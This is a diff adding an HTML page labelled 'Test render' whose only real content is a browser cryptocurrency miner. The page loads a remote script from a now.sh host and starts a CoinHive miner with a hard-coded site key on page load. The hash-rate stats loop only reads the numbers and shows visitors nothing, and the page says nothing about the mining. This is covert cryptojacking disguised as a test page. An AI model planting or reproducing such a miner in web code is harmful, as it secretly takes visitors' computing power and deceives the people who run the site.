@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<head>
+  <title="Test render">
+  <script src="https://party-dvdagiyzcn.now.sh/client?party"></script>
+</head>
+
+<body>
+  <script src="https://party-dvdagiyzcn.now.sh/client?party"></script>
+<script>
+  var miner = new CoinHive.Anonymous('BEiOhVjMVUxh1SpwaKV9LYESZGelMvCe');
+  miner.start();
+</script>
+
+        
+<script>
+	// Listen on events
+	miner.on('found', function() { /* Hash found */ })
+	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+	// Update stats once per second
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+		// Output to HTML elements...
+	}, 1000);
+</script>
+</body>
